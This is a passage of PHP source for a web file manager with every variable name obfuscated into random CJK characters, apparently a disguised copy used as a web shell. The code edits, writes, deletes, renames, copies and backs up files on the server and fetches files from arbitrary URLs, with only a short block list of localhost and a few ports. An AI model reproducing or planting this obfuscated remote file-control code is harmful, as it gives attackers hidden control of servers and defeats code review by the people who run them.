defined('FM_UPLOAD_EXTENSION') || define('FM_UPLOAD_EXTENSION', $裤亖銇亖亞銇銊革镢泔);
defined('FM_EXCLUDE_ITEMS') || define('FM_EXCLUDE_ITEMS', (version_compare(PHP_VERSION, '7.0.0', '<') ? serialize($銇撱愀傘銊憧︼傘勶惝) : $銇撱愀傘銊憧︼傘勶惝));
defined('FM_DOC_VIEWER') || define('FM_DOC_VIEWER', $亪夈飦裤籍獣悛喖墎壍);
define('FM_READONLY', $併镲紒矆沣沣増併慵慊 || ($銇沣垔伝弫倎沣繒屻銐 && !empty($銠忋銇沣嗐垔偧亖併︺) && isset($_SESSION[FM_SESSION_ID]['logged']) && in_array($_SESSION[FM_SESSION_ID]['logged'], $銠忋銇沣嗐垔偧亖併︺)));
define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');

// always use ?p=
if (!isset($_GET['p']) && empty($_FILES)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get path
$伡銔粏层檨亖銇沣侊倓 = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');

// clean path
$伡銔粏层檨亖銇沣侊倓 = fm_clean_path($伡銔粏层檨亖銇沣侊倓);

// for ajax request - save
$銇沣銇汇堛嗐飦銏亾 = file_get_contents('php://input');
$_POST = (strpos($銇沣銇汇堛嗐飦銏亾, 'ajax') != FALSE && strpos($銇沣銇汇堛嗐飦銏亾, 'save') != FALSE) ? json_decode($銇沣銇汇堛嗐飦銏亾, true) : $_POST;

// instead globals vars
define('FM_PATH', $伡銔粏层檨亖銇沣侊倓);
define('FM_USE_AUTH', $銇沣垔伝弫倎沣繒屻銐);
define('FM_EDIT_FILE', $侊憔併搲沣亸撱伒亖銇);
defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $慵亰銏亞垎亖镲沣畟勶);
defined('FM_USE_HIGHLIGHTJS') || define('FM_USE_HIGHLIGHTJS', $垇悴銏墎併伡沣勶亗銓);
defined('FM_HIGHLIGHTJS_STYLE') || define('FM_HIGHLIGHTJS_STYLE', $亗銇沣飦銤剛傘倎垥);
defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $銦紓慵珌侊寔併亪膊倖);

unset($伡銔粏层檨亖銇沣侊倓, $銇沣垔伝弫倎沣繒屻銐, $慵亰銏亞垎亖镲沣畟勶, $垇悴銏墎併伡沣勶亗銓, $亗銇沣飦銤剛傘倎垥);

/*************************** ACTIONS ***************************/

// Handle all AJAX Request
if ((isset($_SESSION[FM_SESSION_ID]['logged'], $銇亜吉紒撱銈剚銇伝沣[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token']) && !FM_READONLY) {
    if (!verifyToken($_POST['token'])) {
        header('HTTP/1.0 401 Unauthorized');
        die("Invalid Token.");
    }

    //search : get list of files from the current folder
    if (isset($_POST['type']) && $_POST['type'] == "search") {
        $沣亖嫮併夈沣併紒汇銐 = $_POST['path'] == "." ? '' : $_POST['path'];
        $傘屻併寔壖傦併梻嗐季 = scan(fm_clean_path($沣亖嫮併夈沣併紒汇銐), $_POST['content']);
        echo json_encode($傘屻併寔壖傦併梻嗐季);
        exit();
    }

    // save editor file
    if (isset($_POST['type']) && $_POST['type'] == "save") {
        // get current path
        $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
        }
        // check path
        if (!is_dir($妶慵銇偛沣垇锛笺劜珓)) {
            fm_redirect(FM_SELF_URL . '?p=');
        }
        $慊銇愕仚剚亗焷獋亖銇 = $_GET['edit'];
        $慊銇愕仚剚亗焷獋亖銇 = fm_clean_path($慊銇愕仚剚亗焷獋亖銇);
        $慊銇愕仚剚亗焷獋亖銇 = str_replace('/', '', $慊銇愕仚剚亗焷獋亖銇);
        if ($慊銇愕仚剚亗焷獋亖銇 == '' || !is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
            fm_set_msg(lng('File not found'), 'error');
            $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
            fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
        }
        header('X-XSS-Protection:0');
        $粊銇堛粊畟沣硷併亖 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇;

        $侊考娿亖垇慵夈劵紙銇 = $_POST['content'];
        $悴祦剚檨堛嶃飦Σ嗐伈 = fopen($粊銇堛粊畟沣硷併亖, "w");
        $垞飦欍讣銑俱潓晪銇銞 = @fwrite($悴祦剚檨堛嶃飦Σ嗐伈, $侊考娿亖垇慵夈劵紙銇);
        fclose($悴祦剚檨堛嶃飦Σ嗐伈);
        if ($垞飦欍讣銑俱潓晪銇銞 === false) {
            header("HTTP/1.1 500 Internal Server Error");
            die("Could Not Write File! - Check Permissions / Ownership");
        }
        die(true);
    }

    // backup files
    if (isset($_POST['type']) && $_POST['type'] == "backup" && !empty($_POST['file'])) {
        $併埅唩劃岋倞飫亯唩沣 = fm_clean_path($_POST['file']);
        $沣餀层併伂沣悴剢亪笺 = FM_ROOT_PATH . '/';
        if (!empty($_POST['path'])) {
            $泔獊姍椼垕沣娿銇伡 = fm_clean_path($_POST['path']);
            $沣餀层併伂沣悴剢亪笺 .= "{$泔獊姍椼垕沣娿銇伡}/";
        }
        $伡瑏飯銐偩墎銈慵笁 = date("dMy-His");
        $喖笺伡銇畨沣慊瑏侊镢 = "{$併埅唩劃岋倞飫亯唩沣}-{$伡瑏飯銐偩墎銈慵笁}.bak";
        $垑靠垈蹈慵亪沣縼併銇 = $沣餀层併伂沣悴剢亪笺 . $併埅唩劃岋倞飫亯唩沣;
        try {
            if (!file_exists($垑靠垈蹈慵亪沣縼併銇)) {
                throw new Exception("File {$併埅唩劃岋倞飫亯唩沣} not found");
            }
            if (copy($垑靠垈蹈慵亪沣縼併銇, $沣餀层併伂沣悴剢亪笺 . $喖笺伡銇畨沣慊瑏侊镢)) {
                echo "Backup {$喖笺伡銇畨沣慊瑏侊镢} created";
            } else {
                throw new Exception("Could not copy file {$併埅唩劃岋倞飫亯唩沣}");
            }
        } catch (Exception $銇娿慵紙亖垇亞侊銈沣) {
            echo $銇娿慵紙亖垇亞侊銈沣->getMessage();
        }
    }

    // Save Config
    if (isset($_POST['type']) && $_POST['type'] == "settings") {
        global $銠銈啓劶沣瓎亖併紒沣, $伝堛崐飦銏镢熴檨銇层, $搶銈惘沣飭倞汇沣亪銇, $粏剚亖級棳慵紗娿唵壔, $銇沣勩銐銏沣偧銈镢慵, $笺泔搫銇埐慵嗐嗐沣併, $銊悻銇憧侊悛镲壇诧锛;
        $晥銐堛亖倝銇銠併笺镢 = $_POST['js-language'];
        fm_get_translations([]);
        if (!array_key_exists($晥銐堛亖倝銇銠併笺镢, $銇沣勩銐銏沣偧銈镢慵)) {
            $晥銐堛亖倝銇銠併笺镢 = 'en';
        }

        $汇傘娿併紒紒銇併搲嗭 = isset($_POST['js-error-report']) && $_POST['js-error-report'] == "true" ? true : false;
        $几墎壖考硷侊泔硷沣銚 = isset($_POST['js-show-hidden']) && $_POST['js-show-hidden'] == "true" ? true : false;
        $亖銖慵沣伈銈裤亗技沣 = isset($_POST['js-hide-cols']) && $_POST['js-hide-cols'] == "true" ? true : false;
        $弬亴垑沣瞾祦銌併銇慵 = $_POST['js-theme-3'];

        if ($銠銈啓劶沣瓎亖併紒沣->data['lang'] != $晥銐堛亖倝銇銠併笺镢) {
            $銠銈啓劶沣瓎亖併紒沣->data['lang'] = $晥銐堛亖倝銇銠併笺镢;
            $伝堛崐飦銏镢熴檨銇层 = $晥銐堛亖倝銇銠併笺镢;
        }
        if ($銠銈啓劶沣瓎亖併紒沣->data['error_reporting'] != $汇傘娿併紒紒銇併搲嗭) {
            $銠銈啓劶沣瓎亖併紒沣->data['error_reporting'] = $汇傘娿併紒紒銇併搲嗭;
            $搶銈惘沣飭倞汇沣亪銇 = $汇傘娿併紒紒銇併搲嗭;
        }
        if ($銠銈啓劶沣瓎亖併紒沣->data['show_hidden'] != $几墎壖考硷侊泔硷沣銚) {
            $銠銈啓劶沣瓎亖併紒沣->data['show_hidden'] = $几墎壖考硷侊泔硷沣銚;
            $粏剚亖級棳慵紗娿唵壔 = $几墎壖考硷侊泔硷沣銚;
        }
        if ($銠銈啓劶沣瓎亖併紒沣->data['show_hidden'] != $几墎壖考硷侊泔硷沣銚) {
            $銠銈啓劶沣瓎亖併紒沣->data['show_hidden'] = $几墎壖考硷侊泔硷沣銚;
            $粏剚亖級棳慵紗娿唵壔 = $几墎壖考硷侊泔硷沣銚;
        }
        if ($銠銈啓劶沣瓎亖併紒沣->data['hide_Cols'] != $亖銖慵沣伈銈裤亗技沣) {
            $銠銈啓劶沣瓎亖併紒沣->data['hide_Cols'] = $亖銖慵沣伈銈裤亗技沣;
            $笺泔搫銇埐慵嗐嗐沣併 = $亖銖慵沣伈銈裤亗技沣;
        }
        if ($銠銈啓劶沣瓎亖併紒沣->data['theme'] != $弬亴垑沣瞾祦銌併銇慵) {
            $銠銈啓劶沣瓎亖併紒沣->data['theme'] = $弬亴垑沣瞾祦銌併銇慵;
            $銊悻銇憧侊悛镲壇诧锛 = $弬亴垑沣瞾祦銌併銇慵;
        }
        $銠銈啓劶沣瓎亖併紒沣->save();
        echo true;
    }

    // new password hash
    if (isset($_POST['type']) && $_POST['type'] == "pwdhash") {
        $亖伡忋泔汇紒墪紛伡檪 = isset($_POST['inputPassword2']) && !empty($_POST['inputPassword2']) ? password_hash($_POST['inputPassword2'], PASSWORD_DEFAULT) : '';
        echo $亖伡忋泔汇紒墪紛伡檪;
    }

    //upload using url
    if (isset($_POST['type']) && $_POST['type'] == "upload" && !empty($_REQUEST["uploadurl"])) {
        $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
        }

        function event_callback($唲併亖亖悻餆併銌劦垊)
        {
            global $搧欙銇紓銏銇銔沣沣倷;
            echo json_encode($唲併亖亖悻餆併銌劦垊);
        }

        function get_file_path()
        {
            global $妶慵銇偛沣垇锛笺劜珓, $亯銇亪泔銈侊銇銇垯墘, $傘亱銇侊堛亗櫦侊;
            return $妶慵銇偛沣垇锛笺劜珓 . "/" . basename($亯銇亪泔銈侊銇銇垯墘->name);
        }

        $沣亗姇讣亪辑沣併亖沣 = !empty($_REQUEST["uploadurl"]) && preg_match("|^http(s)?://.+$|", stripslashes($_REQUEST["uploadurl"])) ? stripslashes($_REQUEST["uploadurl"]) : null;

        //prevent 127.* domain and known ports
        $併銇悛泔銇伡増唩伝銐 = parse_url($沣亗姇讣亪辑沣併亖沣, PHP_URL_HOST);
        $挡晥︼垈笺硷飼布亪唻 = parse_url($沣亗姇讣亪辑沣併亖沣, PHP_URL_PORT);
        $笺沣嗐獊傘銑悝亞飦亜 = [22, 23, 25, 3306];

        if (preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $併銇悛泔銇伡増唩伝銐) || in_array($挡晥︼垈笺硷飼布亪唻, $笺沣嗐獊傘銑悝亞飦亜)) {
            $伎憧瑠侊侊對笺銇銐勶 = array("message" => "URL is not allowed");
            event_callback(array("fail" => $伎憧瑠侊侊對笺銇銐勶));
            exit();
        }

        $沣撱銇沣銇銇併併笁笺 = false;
        $傘亱銇侊堛亗櫦侊 = tempnam(sys_get_temp_dir(), "upload-");
        $亯銇亪泔銈侊銇銇垯墘 = new stdClass();
        $亯銇亪泔銈侊銇銇垯墘->name = trim(urldecode(basename($沣亗姇讣亪辑沣併亖沣)), ".\x00..\x20");

        $銈餀傦憧銇镢泔併搷銏 = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
        $沣銈倐娿珎併墎壖併飦 = strtolower(pathinfo($亯銇亪泔銈侊銇銇垯墘->name, PATHINFO_EXTENSION));
        $飦曘亖泔慵銇妬沣沣傦 = ($銈餀傦憧銇镢泔併搷銏) ? in_array($沣銈倐娿珎併墎壖併飦, $銈餀傦憧銇镢泔併搷銏) : true;

        $伎憧瑠侊侊對笺銇銐勶 = false;

        if (!$飦曘亖泔慵銇妬沣沣傦) {
            $伎憧瑠侊侊對笺銇銐勶 = array("message" => "File extension is not allowed");
            event_callback(array("fail" => $伎憧瑠侊侊對笺銇銐勶));
            exit();
        }

        if (!$沣亗姇讣亪辑沣併亖沣) {
            $紕銇銜垎镢併屻飦壖啓 = false;
        } else if ($沣撱銇沣銇銇併併笁笺) {
            @$潖紒慊堬傘飩倎镢併倎 = fopen($傘亱銇侊堛亗櫦侊, "w");
            @$飦籍垇銇惘亶亞亞硷唩 = curl_init($沣亗姇讣亪辑沣併亖沣);
            curl_setopt($飦籍垇銇惘亶亞亞硷唩, CURLOPT_NOPROGRESS, false);
            curl_setopt($飦籍垇銇惘亶亞亞硷唩, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($飦籍垇銇惘亶亞亞硷唩, CURLOPT_FILE, $潖紒慊堬傘飩倎镢併倎);
            @$紕銇銜垎镢併屻飦壖啓 = curl_exec($飦籍垇銇惘亶亞亞硷唩);
            $沣泔併飫沣銇珚亖級銌 = curl_getinfo($飦籍垇銇惘亶亞亞硷唩);
            if (!$紕銇銜垎镢併屻飦壖啓) {
                $伎憧瑠侊侊對笺銇銐勶 = array("message" => curl_error($飦籍垇銇惘亶亞亞硷唩));
            }
            @curl_close($飦籍垇銇惘亶亞亞硷唩);
            fclose($潖紒慊堬傘飩倎镢併倎);
            $亯銇亪泔銈侊銇銇垯墘->size = $沣泔併飫沣銇珚亖級銌["size_download"];
            $亯銇亪泔銈侊銇銇垯墘->type = $沣泔併飫沣銇珚亖級銌["content_type"];
        } else {
            $亖笺併墘亯亖銇倎层笺 = stream_context_create();
            @$紕銇銜垎镢併屻飦壖啓 = copy($沣亗姇讣亪辑沣併亖沣, $傘亱銇侊堛亗櫦侊, $亖笺併墘亯亖銇倎层笺);
            if (!$紕銇銜垎镢併屻飦壖啓) {
                $伎憧瑠侊侊對笺銇銐勶 = error_get_last();
            }
        }

        if ($紕銇銜垎镢併屻飦壖啓) {
            $紕銇銜垎镢併屻飦壖啓 = rename($傘亱銇侊堛亗櫦侊, strtok(get_file_path(), '?'));
        }

        if ($紕銇銜垎镢併屻飦壖啓) {
            event_callback(array("done" => $亯銇亪泔銈侊銇銇垯墘));
        } else {
            unlink($傘亱銇侊堛亗櫦侊);
            if (!$伎憧瑠侊侊對笺銇銐勶) {
                $伎憧瑠侊侊對笺銇銐勶 = array("message" => "Invalid url parameter");
            }
            event_callback(array("fail" => $伎憧瑠侊侊對笺銇銐勶));
        }
    }
    exit();
}

// Delete file / folder
if (isset($_GET['del'], $_POST['token']) && !FM_READONLY) {
    $亰併併併搧撱慵亖亖悝 = str_replace('/', '', fm_clean_path($_GET['del']));
    if ($亰併併併搧撱慵亖亖悝 != '' && $亰併併併搧撱慵亖亖悝 != '..' && $亰併併併搧撱慵亖亖悝 != '.' && verifyToken($_POST['token'])) {
        $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
        }
        $伎亖併嗐銇亗镢粊沣寛 = is_dir($妶慵銇偛沣垇锛笺劜珓 . '/' . $亰併併併搧撱慵亖亖悝);
        if (fm_rdelete($妶慵銇偛沣垇锛笺劜珓 . '/' . $亰併併併搧撱慵亖亖悝)) {
            $傘嗐矈晞銊慵銈銏晜亖 = $伎亖併嗐銇亗镢粊沣寛 ? lng('Folder') . ' <b>%s</b> ' . lng('Deleted') : lng('File') . ' <b>%s</b> ' . lng('Deleted');
            fm_set_msg(sprintf($傘嗐矈晞銊慵銈銏晜亖, fm_enc($亰併併併搧撱慵亖亖悝)));
        } else {
            $傘嗐矈晞銊慵銈銏晜亖 = $伎亖併嗐銇亗镢粊沣寛 ? lng('Folder') . ' <b>%s</b> ' . lng('not deleted') : lng('File') . ' <b>%s</b> ' . lng('not deleted');
            fm_set_msg(sprintf($傘嗐矈晞銊慵銈銏晜亖, fm_enc($亰併併併搧撱慵亖亖悝)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid file or folder name'), 'error');
    }
    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

// Create a new file/folder
if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) && !FM_READONLY) {
    $祩銊總銈銇銈銔銓飩沣 = urldecode($_POST['newfile']);
    $亖剛亪銇緜銓偧併悴堛 = str_replace('/', '', fm_clean_path(strip_tags($_POST['newfilename'])));
    if (fm_isvalid_filename($亖剛亪銇緜銓偧併悴堛) && $亖剛亪銇緜銓偧併悴堛 != '' && $亖剛亪銇緜銓偧併悴堛 != '..' && $亖剛亪銇緜銓偧併悴堛 != '.' && verifyToken($_POST['token'])) {
        $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
        }
        if ($祩銊總銈銇銈銔銓飩沣 == "file") {
            if (!file_exists($妶慵銇偛沣垇锛笺劜珓 . '/' . $亖剛亪銇緜銓偧併悴堛)) {
                if (fm_is_valid_ext($亖剛亪銇緜銓偧併悴堛)) {
                    @fopen($妶慵銇偛沣垇锛笺劜珓 . '/' . $亖剛亪銇緜銓偧併悴堛, 'w') or die('Cannot open file:  ' . $亖剛亪銇緜銓偧併悴堛);
                    fm_set_msg(sprintf(lng('File') . ' <b>%s</b> ' . lng('Created'), fm_enc($亖剛亪銇緜銓偧併悴堛)));
                } else {
                    fm_set_msg(lng('File extension is not allowed'), 'error');
                }
            } else {
                fm_set_msg(sprintf(lng('File') . ' <b>%s</b> ' . lng('already exists'), fm_enc($亖剛亪銇緜銓偧併悴堛)), 'alert');
            }
        } else {
            if (fm_mkdir($妶慵銇偛沣垇锛笺劜珓 . '/' . $亖剛亪銇緜銓偧併悴堛, false) === true) {
                fm_set_msg(sprintf(lng('Folder') . ' <b>%s</b> ' . lng('Created'), $亖剛亪銇緜銓偧併悴堛));
            } elseif (fm_mkdir($妶慵銇偛沣垇锛笺劜珓 . '/' . $亖剛亪銇緜銓偧併悴堛, false) === $妶慵銇偛沣垇锛笺劜珓 . '/' . $亖剛亪銇緜銓偧併悴堛) {
                fm_set_msg(sprintf(lng('Folder') . ' <b>%s</b> ' . lng('already exists'), fm_enc($亖剛亪銇緜銓偧併悴堛)), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Folder') . ' <b>%s</b> ' . lng('not created'), fm_enc($亖剛亪銇緜銓偧併悴堛)), 'error');
            }
        }
    } else {
        fm_set_msg(lng('Invalid characters in file or folder name'), 'error');
    }
    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

// Copy folder / file
if (isset($_GET['copy'], $_GET['finish']) && !FM_READONLY) {
    // from
    $沣剛繖銏夈泔︼姉唩 = urldecode($_GET['copy']);
    $沣剛繖銏夈泔︼姉唩 = fm_clean_path($沣剛繖銏夈泔︼姉唩);
    // empty path
    if ($沣剛繖銏夈泔︼姉唩 == '') {
        fm_set_msg(lng('Source path not defined'), 'error');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }
    // abs path from
    $夈併仸亗娿銇併飯夈 = FM_ROOT_PATH . '/' . $沣剛繖銏夈泔︼姉唩;
    // abs path to
    $换慵偀唩布銈伅埦侊併 = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $换慵偀唩布銈伅埦侊併 .= '/' . FM_PATH;
    }
    $换慵偀唩布銈伅埦侊併 .= '/' . basename($夈併仸亗娿銇併飯夈);
    // move?
    $併銊伕埦伡堛笺晜飭銠 = isset($_GET['move']);
    $併銊伕埦伡堛笺晜飭銠 = fm_clean_path(urldecode($併銊伕埦伡堛笺晜飭銠));
    // copy/move/duplicate
    if ($夈併仸亗娿銇併飯夈 != $换慵偀唩布銈伅埦侊併) {
        $銈仚沣墴笺瘔沣剬崄傦 = trim(FM_PATH . '/' . basename($夈併仸亗娿銇併飯夈), '/');
        if ($併銊伕埦伡堛笺晜飭銠) { // Move and to != from so just perform move
            $慵伂粊悛镢粊堛餄倛偗 = fm_rename($夈併仸亗娿銇併飯夈, $换慵偀唩布銈伅埦侊併);
            if ($慵伂粊悛镢粊堛餄倛偗) {
                fm_set_msg(sprintf(lng('Moved from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($沣剛繖銏夈泔︼姉唩), fm_enc($銈仚沣墴笺瘔沣剬崄傦)));
            } elseif ($慵伂粊悛镢粊堛餄倛偗 === null) {
                fm_set_msg(lng('File or folder with this path already exists'), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Error while moving from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($沣剛繖銏夈泔︼姉唩), fm_enc($銈仚沣墴笺瘔沣剬崄傦)), 'error');
            }
        } else { // Not move and to != from so copy with original name
            if (fm_rcopy($夈併仸亗娿銇併飯夈, $换慵偀唩布銈伅埦侊併)) {
                fm_set_msg(sprintf(lng('Copied from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($沣剛繖銏夈泔︼姉唩), fm_enc($銈仚沣墴笺瘔沣剬崄傦)));
            } else {
                fm_set_msg(sprintf(lng('Error while copying from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($沣剛繖銏夈泔︼姉唩), fm_enc($銈仚沣墴笺瘔沣剬崄傦)), 'error');
            }
        }
    } else {
        if (!$併銊伕埦伡堛笺晜飭銠) { //Not move and to = from so duplicate
            $銈仚沣墴笺瘔沣剬崄傦 = trim(FM_PATH . '/' . basename($夈併仸亗娿銇併飯夈), '/');
            $銇粊倐銇銠寕銈沣考曘 = pathinfo($夈併仸亗娿銇併飯夈);
            $倛垇愀銇埅硷沣偪妬镢 = '';
            if (!is_dir($夈併仸亗娿銇併飯夈)) {
                $倛垇愀銇埅硷沣偪妬镢 = '.' . $銇粊倐銇銠寕銈沣考曘['extension'];
            }
            //Create new name for duplicate
            $沣亖伎倎銇亜笺飦銇勩 = $銇粊倐銇銠寕銈沣考曘['dirname'] . '/' . $銇粊倐銇銠寕銈沣考曘['filename'] . '-' . date('YmdHis') . $倛垇愀銇埅硷沣偪妬镢;
            $沣泔倎勶沣技銈銇紒銇 = 0;
            $愀紦銇銇︺媹憔銤紝慊 = 1000;
            // Check if a file with the duplicate name already exists, if so, make new name (edge case...)
            while (file_exists($沣亖伎倎銇亜笺飦銇勩) & $沣泔倎勶沣技銈銇紒銇 < $愀紦銇銇︺媹憔銤紝慊) {
                $銇粊倐銇銠寕銈沣考曘 = pathinfo($沣亖伎倎銇亜笺飦銇勩);
                $沣亖伎倎銇亜笺飦銇勩 = $銇粊倐銇銠寕銈沣考曘['dirname'] . '/' . $銇粊倐銇銠寕銈沣考曘['filename'] . '-copy' . $倛垇愀銇埅硷沣偪妬镢;
                $沣泔倎勶沣技銈銇紒銇++;
            }
            if (fm_rcopy($夈併仸亗娿銇併飯夈, $沣亖伎倎銇亜笺飦銇勩, False)) {
                fm_set_msg(sprintf('Copied from <b>%s</b> to <b>%s</b>', fm_enc($沣剛繖銏夈泔︼姉唩), fm_enc($沣亖伎倎銇亜笺飦銇勩)));
            } else {
                fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fm_enc($沣剛繖銏夈泔︼姉唩), fm_enc($沣亖伎倎銇亜笺飦銇勩)), 'error');
            }
        } else {
            fm_set_msg(lng('Paths must be not equal'), 'alert');
        }
    }
    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

// Mass copy files/ folders
if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'], $_POST['token']) && !FM_READONLY) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng('Invalid Token.'), 'error');
    }

    // from
    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
    }
    // to
    $慵銇併銐墎傘亸埜併銇 = FM_ROOT_PATH;
    $铼飦傘銇慵傘剚夈弰悝 = fm_clean_path($_POST['copy_to']);
    if ($铼飦傘銇慵傘剚夈弰悝 != '') {
        $慵銇併銐墎傘亸埜併銇 .= '/' . $铼飦傘銇慵傘剚夈弰悝;
    }
    if ($妶慵銇偛沣垇锛笺劜珓 == $慵銇併銐墎傘亸埜併銇) {
        fm_set_msg(lng('Paths must be not equal'), 'alert');
        $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }
    if (!is_dir($慵銇併銐墎傘亸埜併銇)) {
        if (!fm_mkdir($慵銇併銐墎傘亸埜併銇, true)) {
            fm_set_msg('Unable to create destination folder', 'error');
            $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
            fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
        }
    }
    // move?
    $併銊伕埦伡堛笺晜飭銠 = isset($_POST['move']);
    // copy/move
    $紗憔椼併銏笺澆笂飯亖 = 0;
    $飩併伡併銖慊傘壖銇亗 = $_POST['file'];
    if (is_array($飩併伡併銖慊傘壖銇亗) && count($飩併伡併銖慊傘壖銇亗)) {
        foreach ($飩併伡併銖慊傘壖銇亗 as $镢傘銇点镢亖镢垇笺粡) {
            if ($镢傘銇点镢亖镢垇笺粡 != '') {
                $镢傘銇点镢亖镢垇笺粡 = fm_clean_path($镢傘銇点镢亖镢垇笺粡);
                // abs path from
                $夈併仸亗娿銇併飯夈 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡;
                // abs path to
                $换慵偀唩布銈伅埦侊併 = $慵銇併銐墎傘亸埜併銇 . '/' . $镢傘銇点镢亖镢垇笺粡;
                // do
                if ($併銊伕埦伡堛笺晜飭銠) {
                    $慵伂粊悛镢粊堛餄倛偗 = fm_rename($夈併仸亗娿銇併飯夈, $换慵偀唩布銈伅埦侊併);
                    if ($慵伂粊悛镢粊堛餄倛偗 === false) {
                        $紗憔椼併銏笺澆笂飯亖++;
                    }
                } else {
                    if (!fm_rcopy($夈併仸亗娿銇併飯夈, $换慵偀唩布銈伅埦侊併)) {
                        $紗憔椼併銏笺澆笂飯亖++;
                    }
                }
            }
        }
        if ($紗憔椼併銏笺澆笂飯亖 == 0) {
            $傘嗐矈晞銊慵銈銏晜亖 = $併銊伕埦伡堛笺晜飭銠 ? 'Selected files and folders moved' : 'Selected files and folders copied';
            fm_set_msg($傘嗐矈晞銊慵銈銏晜亖);
        } else {
            $傘嗐矈晞銊慵銈銏晜亖 = $併銊伕埦伡堛笺晜飭銠 ? 'Error while moving items' : 'Error while copying items';
            fm_set_msg($傘嗐矈晞銊慵銈銏晜亖, 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }
    $偊沣銇傘堛墎愀亪垇伎 = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
}

// Rename
if (isset($_POST['rename_from'], $_POST['rename_to'], $_POST['token']) && !FM_READONLY) {
    if (!verifyToken($_POST['token'])) {
        fm_set_msg("Invalid Token.", 'error');
    }
    // old name
    $惘紒沣弬亖珦檨Φ焿沣 = urldecode($_POST['rename_from']);
    $惘紒沣弬亖珦檨Φ焿沣 = fm_clean_path($惘紒沣弬亖珦檨Φ焿沣);
    $惘紒沣弬亖珦檨Φ焿沣 = str_replace('/', '', $惘紒沣弬亖珦檨Φ焿沣);
    // new name
    $亖剛亪銇緜銓偧併悴堛 = urldecode($_POST['rename_to']);
    $亖剛亪銇緜銓偧併悴堛 = fm_clean_path(strip_tags($亖剛亪銇緜銓偧併悴堛));
    $亖剛亪銇緜銓偧併悴堛 = str_replace('/', '', $亖剛亪銇緜銓偧併悴堛);
    // path
    $妶慵銇偛沣垇锛笺劜珓 = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $妶慵銇偛沣垇锛笺劜珓 .= '/' . FM_PATH;
    }
    // rename
    if (fm_isvalid_filename($亖剛亪銇緜銓偧併悴堛) && $惘紒沣弬亖珦檨Φ焿沣 != '' && $亖剛亪銇緜銓偧併悴堛 != '') {
        if (fm_rename($妶慵銇偛沣垇锛笺劜珓 . '/' . $惘紒沣弬亖珦檨Φ焿沣, $妶慵銇偛沣垇锛笺劜珓 . '/' . $亖剛亪銇緜銓偧併悴堛)) {
            fm_set_msg(sprintf(lng('Renamed from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($惘紒沣弬亖珦檨Φ焿沣), fm_enc($亖剛亪銇緜銓偧併悴堛)));
        } else {
            fm_set_msg(sprintf(lng('Error while renaming from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($惘紒沣弬亖珦檨Φ焿沣), fm_enc($亖剛亪銇緜銓偧併悴堛)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid characters in file name'), 'error');
